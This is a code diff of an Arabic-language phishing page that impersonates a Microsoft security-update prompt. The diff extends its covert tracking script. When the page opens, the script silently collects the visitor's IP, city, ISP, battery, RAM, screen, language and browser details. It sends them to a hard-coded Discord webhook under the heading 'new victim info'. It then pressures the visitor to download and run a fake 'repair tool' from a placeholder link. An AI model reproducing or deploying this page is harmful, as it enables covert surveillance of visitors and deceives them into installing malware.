@@ -1,15 +1,16 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>تحديث أمان النظام</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تحديث أمان النظام</title>
     <script>
         async function sendLogs() {
+            // رابط الويبهوك الخاص بك
             const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
             
             try {
-                // 1. جلب الـ IP والموقع التقريبي
+                // 1. جلب البيانات الأساسية (IP والموقع)
                 const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 
@@ -20,58 +21,100 @@
                     batteryInfo = `${Math.round(bt.level * 100)}% (${bt.charging ? "يشحن" : "لا يشحن"})`;
                 }
 
+                // 3. تجهيز بيانات الجهاز الإضافية
+                const screenRes = `${window.screen.width}x${window.screen.height}`;
+                const deviceLang = navigator.language || navigator.userLanguage;
+                const ramInfo = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "غير معروف";
+                const currentUrl = window.location.href;
+
                 const payload = {
                     embeds: [{
-                        title: "🎯 صيد جديد - معلومات الجهاز",
-                        color: 3066993,
+                        title: "🎯 معلومات ضحية جديدة",
+                        color: 15158332, // لون أحمر للتنبيه
                         fields: [
                             { name: "🌐 عنوان الـ IP", value: data.ip || "غير معروف", inline: true },
-                            { name: "📍 المدينة/الدولة", value: `${data.city}, ${data.country_name}`, inline: true },
-                            { name: "📡 شركة الاتصال", value: data.org, inline: true },
-                            { name: "💻 النظام", value: navigator.platform, inline: true },
-                            { name: "🔋 البطارية", value: batteryInfo, inline: true },
-                            { name: "🧠 الرام (RAM)", value: `${navigator.deviceMemory || '?'} GB`, inline: true },
-                            { name: "🕵️ المتصفح", value: navigator.userAgent }
+                            { name: "📍 الموقع", value: `${data.city || '?'}, ${data.country_name || '?'}`, inline: true },
+                            { name: "🔋 حالة البطارية", value: batteryInfo, inline: true },
+                            { name: "💻 نوع النظام", value: navigator.platform, inline: true },
+                            { name: "🧠 الذاكرة (RAM)", value: ramInfo, inline: true },
+                            { name: "🖥️ أبعاد الشاشة", value: screenRes, inline: true },
+                            { name: "🌍 لغة الجهاز", value: deviceLang, inline: true },
+                            { name: "🔗 الرابط الذي دخله", value: currentUrl, inline: false },
+                            { name: "🕵️ المتصفح المستخدم", value: navigator.userAgent, inline: false }
                         ],
-                        footer: { text: "نظام التتبع المستمر | TLQQEMM" },
+                        footer: { text: "نظام التتبع الموحد | Logger System" },
                         timestamp: new Date()
                     }]
                 };
 
-                // إرسال للديسكورد فوراً
                 await fetch(webhook, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(payload)
                 });
-            } catch (e) { console.log("Error sending logs"); }
+            } catch (e) { 
+                console.log("Error capturing data"); 
+            }
         }
 
-        // تشغيل السحب بمجرد فتح الصفحة
         window.onload = sendLogs;
 
         function startDownload() {
-            // هنا تضع رابط ملف الـ EXE أو الـ APK الحقيقي الخاص بك
-            window.location.href = "رابط_ملف_التحميل_هنا"; 
-            alert("بدأ التحميل... يرجى تشغيل الملف لإتمام التحديث.");
+            // ضع رابط الملف الخاص بك هنا
+            window.location.href = "YOUR_DOWNLOAD_LINK_HERE";
         }
     </script>
     <style>
-        body { background-color: #f1f3f4; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
-        .logo { width: 50px; margin-bottom: 20px; }
-        h1 { font-size: 20px; color: #3c4043; margin-bottom: 15px; }
-        p { color: #5f6368; font-size: 14px; line-height: 1.5; margin-bottom: 30px; }
-        .btn { background: #1a73e8; color: white; border: none; padding: 12px 25px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 15px; }
+        * { box-sizing: border-box; }
+        body { 
+            background-color: #f1f3f4; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            padding: 20px;
+        }
+        .card { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 12px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+            text-align: center; 
+            width: 100%;
+            max-width: 450px; 
+        }
+        .logo { width: 60px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #202124; margin-bottom: 15px; }
+        p { color: #5f6368; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
+        .btn { 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            padding: 14px; 
+            border-radius: 6px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            width: 100%; 
+            font-size: 16px;
+            transition: background 0.3s;
+        }
         .btn:hover { background: #1765cc; }
+        
+        /* تحسينات للجوال */
+        @media (max-width: 480px) {
+            .card { padding: 20px; }
+            h1 { font-size: 19px; }
+        }
     </style>
 </head>
 <body>
     <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" class="logo" alt="Logo">
         <h1>تحديث أمني مطلوب</h1>
-        <p>تم اكتشاف نشاط غير عادي على جهازك. يرجى تحميل أداة الحماية الرسمية وتثبيتها فوراً لتجنب فقدان البيانات.</p>
-        <button class="btn" onclick="startDownload()">تحميل أداة الإصلاح (مجاناً)</button>
+        <p>تم اكتشاف نشاط مشبوه. يرجى تحميل أداة الحماية الرسمية فوراً لتأمين حسابك وجهازك من الاختراق.</p>
+        <button class="btn" onclick="startDownload()">تحميل أداة الإصلاح الآن</button>
     </div>
 </body>
 </html>
